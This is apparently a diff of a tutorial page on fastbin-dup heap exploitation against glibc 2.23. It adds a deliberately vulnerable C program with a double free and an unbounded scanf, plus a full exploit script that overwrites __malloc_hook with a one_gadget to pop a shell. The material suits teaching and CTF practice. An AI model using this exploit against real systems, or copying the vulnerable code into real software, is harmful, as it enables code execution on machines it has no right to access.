@@ -10,6 +10,7 @@ categories:
 tags:
   - fastbin-dup
   - fastbin
+  - heap-exploitation
 ---
 # Fastbin Exploitation
 
@@ -67,6 +68,29 @@ memory address.
 ##### Example
 
 Vulnerable Application Code
+
+This example is done on `glibc 2.23` 
+
+```sh
+pwn@90782eb49a00:~/workspace$ /lib/x86_64-linux-gnu/libc.so.6 
+GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.
+Copyright (C) 2016 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 5.4.0 20160609.
+Available extensions:
+	crypt add-on version 2.1 by Michael Glad and others
+	GNU Libidn by Simon Josefsson
+	Native POSIX Threads Library by Ulrich Drepper et al
+	BIND-8.2.3-T5B
+libc ABIs: UNIQUE IFUNC
+For bug reporting instructions, please see:
+<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
+
+```
+
+In modern `glibc` you would need to fill in the `tcache` bins first. 
 
 ```c
 #include <stdio.h>
@@ -173,8 +197,6 @@ The application has 4 main functions
 	- Enter data in a specific chunk
 4. `check()`
 	- check if `targets.target = 'admin`. If it is it gives you a shell.
-
-
 ###### Exploitation
 
 To achieve the `fastbin dup` we have to overwrite a the forward (`fd`) pointer, of a chunk in the `fastbin` using a double free or use-after-free ( double-free in this case). If we can overwrite `fd` pointer, we can trick the allocator to return a pointer out target location the next time we allocate another chunk.
@@ -300,8 +322,266 @@ Was able to perform the arbitrary write.
 
 target `__free_hook` of `__malloc_hook` and set up a one-gadget
 
-- comming soon
+##### Example
 
+This is just like the previous example except that our target memory location is now the `_-free_hook` or `__malloc_hook` 
+
+Vulnerable code
+
+
+This example is done on `glibc 2.23` 
+
+```sh
+pwn@90782eb49a00:~/workspace$ /lib/x86_64-linux-gnu/libc.so.6 
+GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.
+Copyright (C) 2016 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 5.4.0 20160609.
+Available extensions:
+	crypt add-on version 2.1 by Michael Glad and others
+	GNU Libidn by Simon Josefsson
+	Native POSIX Threads Library by Ulrich Drepper et al
+	BIND-8.2.3-T5B
+libc ABIs: UNIQUE IFUNC
+For bug reporting instructions, please see:
+<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
+
+```
+
+In modern `glibc` you would need to fill in the `tcache` bins first. 
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+char *ptrs[10];
+int count = 0;
+
+void allocate() {
+        printf("Enter size: ");
+        int size;
+        scanf("%d", &size);
+        ptrs[count] = (char*)malloc(size);
+        count++;
+}
+
+
+void deallocate() {
+        printf("Enter Index: ");
+        int index;
+        scanf("%d", &index);
+        free(ptrs[index]);
+}
+
+
+void get_data() {
+        printf("Enter Index: ");
+        int index;
+        scanf("%d", &index);
+        
+        printf("Enter data: ");
+        //fgets(ptrs[index], 64, stdin);
+        scanf("%s", ptrs[index]);
+}
+
+void menu() {
+        puts("1. malloc");
+        puts("2. free");
+        puts("3. scanf");
+}
+
+
+int main() {
+
+        setbuf(stdin, NULL);
+        setbuf(stdout, NULL);
+
+        printf("leak = %p\n", printf);
+
+        int choice;
+        while (1) {
+                menu();
+                printf("> ");
+                scanf("%d", &choice);
+                switch (choice) {
+                        case 1:
+                                allocate();
+                                break;
+                        case 2: 
+                                deallocate();
+                                break;
+                        case 3:
+                                get_data();
+                                break;
+                        default:
+                                puts("Invalid Choice");
+                }       
+        }
+
+        return 0;
+}
+```
+
+The application has 3 main functions
+
+1. `allocate()`
+	- get size from user and allocate a `malloc` a chunk of that size.
+2. `deallocate()`
+	- `free` a chunk
+3. `get_data()`
+	- Enter data in a specific chunk
+
+###### Exploitation
+
+Lets trigger the double-free vulnerability 
+
+```python
+malloc(92) # 0
+malloc(92) # 1
+
+free(0)
+free(1)
+free(0)
+```
+
+Lets view the fast bins
+
+![Arbitrary Write](/assets/images/pwn/fastbin_dup/cfastbin1.png)
+
+The chunk `0x602080` appears twice in the `fastbin`.
+
+The next call to `malloc` of the size `92` will return the `0x602080` chunk which we will use to overwrite the `fd` pointer of the chunk `0x602080` that is still in the `fastbin`. 
+
+But do we overwrite the `fd` with?
+
+Our target here will be the `__malloc_hook`, but we need to remember that our target has to have the correct metadata (size field) to get pass the size check `malloc(): memory corruption (fast)` mitigation.
+
+Lets take a look at `__malloc_hook` 
+
+![Arbitrary Write](/assets/images/pwn/fastbin_dup/malloc_hook.png)
+
+`__malloc_hook` is at `0x7ffff7bc4b10` but we can see that the previous word is a large number which won't pass the size check. So we need to look near `__malloc_hook` where we can place our data
+
+Lets look at `__malloc_hook` - 35
+
+![Arbitrary Write](/assets/images/pwn/fastbin_dup/malloc_hook35.png)
+
+We can see that at the address `0x7ffff7bc4af5` there is `0x7f` which is perfect for use can it will pass the `fastbin` size field check.
+
+So now we have to allocate
+
+```python
+malloc(92) # 2 | 0 
+target = libc.sym['__malloc_hook'] - 35
+get_data(0 ,p64(target))
+
+malloc(92) # 3 | 1
+malloc(92) # 4 | 0 (again)
+```
+
+The next call to `malloc` we return our target memory location.
+
+First find a one gadget.
+
+![Arbitrary Write](/assets/images/pwn/fastbin_dup/one_gadget.png)
+
+I will use `0xf1247`.
+
+```python
+malloc(92)
+one_gadget = libc.address + 0xf1247
+payload = flat(
+	cyclic(0x13), # padding to __malloc_hook  
+	one_gadget
+)
+get_data(5, payload)
+```
+
+The next call to `malloc` will pop a shell
+
+```python
+malloc(92)
+```
+
+Final exploit
+
+```python
+def malloc(size:int):
+	log.info("calling malloc ...")
+	sla(b"> ", b'1')
+	sla(b"Enter size: ", str(size).encode())
+	
+def free(index:int):
+	log.info("calling free ...")
+	sla(b"> ", b'2')
+	sla(b"Enter Index: ", str(index).encode())
+	
+def get_data(index:int, data:bytes):
+	log.info("calling scanf ...")
+	sla(b"> ", b'3')
+	sla(b"Enter Index: ", str(index).encode())
+	sla(b"Enter data: ", data)
+	
+def exploit():
+	##################################################################### 
+	######################## EXPLOIT CODE ###############################
+	#####################################################################
+
+	ru("leak = ")
+	printf = int(rl(), 16)
+	print_leak("printf ", printf)
+
+	libc.address = printf - libc.sym["printf"]
+	print_leak("libc base address", libc.address)
+
+	malloc_hook = libc.sym['__malloc_hook']
+	print_leak("__malloc_hook", malloc_hook)
+
+	one_gadget = libc.address + 0xf1247
+	print_leak("one gadget", one_gadget)
+	payload = flat(
+		cyclic(0x13), # padding to __malloc_hook
+		one_gadget
+	)
+	#print_leak("payload ", payload)
+
+	size = 0x60
+	log.info(f"We will malloc chunks of size: {size}")
+
+	# double free
+
+	malloc(size)
+	malloc(size)
+
+	free(0)
+	free(1)
+	free(0)
+
+	malloc(size) # 2 | same as 0
+	#target = (malloc_hook - 35 + 16) - 0x200000
+	target = malloc_hook - 35 
+	print_leak("target", target)
+	get_data(2, p64(target))
+
+
+	malloc(size) # 3 | same as 1
+	malloc(size) # 4 | same as 0
+	get_data(4, b"AAAA")
+	malloc(size) # 5 enter one
+
+	get_data(5, payload)
+	malloc(size)
+
+```
+
+This gets has a shell.
+
+![Arbitrary Write](/assets/images/pwn/fastbin_dup/shell2.png)
+
+The reason why we request chunks of size 92 earlier is because we want the those chunks to belong to the `0x70 fastbin`, which is the same `fastbin` that the our fake chunk near `__malloc_hook` will be placed in if it was freed (`0x7f` in this case). This is done so that chunk can have the correct size.  
 ## Write Targets
 So which targets would we wish to overwrite?
 - `__free_hook`
